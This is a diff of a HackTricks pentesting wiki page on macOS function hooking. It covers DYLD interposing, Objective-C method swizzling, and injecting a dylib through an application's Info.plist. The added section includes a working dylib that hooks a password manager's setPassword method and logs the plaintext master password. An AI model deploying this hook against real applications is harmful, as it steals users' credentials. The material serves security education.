@@ -1,22 +1,25 @@
 # macOS Function Hooking
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary>Support HackTricks</summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## Function Interposing
 
 Create a **dylib** with an **`__interpose`** section (or a section flagged with **`S_INTERPOSING`**) containing tuples of **function pointers** that refer to the **original** and the **replacement** functions.
 
-Then, **inject** the dylib with **`DYLD_INSERT_LIBRARIES`** (the interposing needs occur before the main app lodas). Obviously this restriction has the **restrictions** applied to the use of DYLD\_INSERT\_LIBRARIES.&#x20;
+Then, **inject** the dylib with **`DYLD_INSERT_LIBRARIES`** (the interposing needs occur before the main app loads). Obviously the [**restrictions** applied to the use of **`DYLD_INSERT_LIBRARIES`** applies here also](../macos-proces-abuse/macos-library-injection/#check-restrictions).&#x20;
 
 ### Interpose printf
 
@@ -34,7 +37,7 @@ int my_printf(const char *format, ...) {
     //int ret = vprintf(format, args);
     //va_end(args);
 
-    int ret = printf("[+] Hello from interpose\n");
+    int ret = printf("Hello from interpose\n");
     return ret;
 }
 
@@ -50,21 +53,50 @@ __attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned lon
 #include <stdio.h>
 
 int main() {
-    printf("Hello, World!\n");
+    printf("Hello World!\n");
     return 0;
 }
+```
+{% endtab %}
+
+{% tab title="interpose2.c" %}
+```c
+// Just another way to define an interpose
+// gcc -dynamiclib interpose2.c -o interpose2.dylib
+
+#include <stdio.h>
+
+#define DYLD_INTERPOSE(_replacement, _replacee) \
+    __attribute__((used)) static struct { \
+        const void* replacement; \
+        const void* replacee; \
+    } _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
+        (const void*) (unsigned long) &_replacement, \
+        (const void*) (unsigned long) &_replacee \
+    };
+
+int my_printf(const char *format, ...)
+{
+    int ret = printf("Hello from interpose\n");
+    return ret;
+}
+
+DYLD_INTERPOSE(my_printf,printf);
 ```
 {% endtab %}
 {% endtabs %}
 
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
-[+] Hello from interpose
+Hello from interpose
+
+DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
+Hello from interpose
 ```
 
 ## Method Swizzling
 
-In ObjectiveC this is how a method is called: `[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`
+In ObjectiveC this is how a method is called like: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**
 
 It's needed the **object**, the **method** and the **params**. And when a method is called a **msg is sent** using the function **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`
 
@@ -148,7 +180,11 @@ int main() {
 
 ### Method Swizzling with method\_exchangeImplementations
 
-The function method\_exchangeImplementations allows to change the address of one function for the other. So when a function is called what is executed is the other one.
+The function **`method_exchangeImplementations`** allows to **change** the **address** of the **implementation** of **one function for the other**.
+
+{% hint style="danger" %}
+So when a function is called what is **executed is the other one**.
+{% endhint %}
 
 ```objectivec
 //gcc -framework Foundation swizzle_str.m -o swizzle_str
@@ -182,7 +218,7 @@ int main(int argc, const char * argv[]) {
     method_exchangeImplementations(originalMethod, swizzledMethod);
 
     // We changed the address of one method for the other
-    // Now when the method substringFromIndex is called, what is really coode is swizzledSubstringFromIndex
+    // Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
     // And when swizzledSubstringFromIndex is called, substringFromIndex is really colled
     
     // Example usage
@@ -193,6 +229,12 @@ int main(int argc, const char * argv[]) {
     return 0;
 }
 ```
+
+{% hint style="warning" %}
+In this case if the **implementation code of the legit** method **verifies** the **method** **name** it could **detect** this swizzling and prevent it from running.
+
+The following technique doesn't have this restriction.
+{% endhint %}
 
 ### Method Swizzling with method\_setImplementation
 
@@ -268,24 +310,77 @@ So the attacker vector would be to either find a vulnerability or strip the sign
 <key>LSEnvironment</key>
 <dict>
     <key>DYLD_INSERT_LIBRARIES</key> 
-    <string>/Applications/MacPass.app/Contents/malicious.dylib</string>
+    <string>/Applications/Application.app/Contents/malicious.dylib</string>
 </dict>
 ```
 
+and then **re-register** the application:
+
+{% code overflow="wrap" %}
+```bash
+/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
+```
+{% endcode %}
+
 Add in that library the hooking code to exfiltrate the information: Passwords, messages...
+
+{% hint style="danger" %}
+Note that in newer versions of macOS if you **strip the signature** of the application binary and it was previously executed, macOS **won't be executing the application** anymore.
+{% endhint %}
+
+#### Library example
+
+```objectivec
+// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib
+
+// If you added env vars in the Info.plist don't forget to call lsregister as explained before
+
+// Listen to the logs with something like:
+// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'
+
+#include <Foundation/Foundation.h>
+#import <objc/runtime.h>
+
+// Here will be stored the real method (setPassword in this case) address
+static IMP real_setPassword = NULL;
+
+static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
+{
+    // Function that will log the password and call the original setPassword(pass, file_path) method
+    NSLog(@"[+] Password is: %@", password);
+    
+    // After logging the password call the original method so nothing breaks.
+    return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
+}
+
+// Library constructor to execute
+__attribute__((constructor))
+static void customConstructor(int argc, const char **argv) {
+    // Get the real method address to not lose it
+    Class classMPDocument = NSClassFromString(@"MPDocument");
+    Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));
+    
+    // Make the original method setPassword call the fake implementation one
+    IMP fake_IMP = (IMP)custom_setPassword;
+    real_setPassword = method_setImplementation(real_Method, fake_IMP);
+}
+```
 
 ## References
 
 * [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary>Support HackTricks</summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
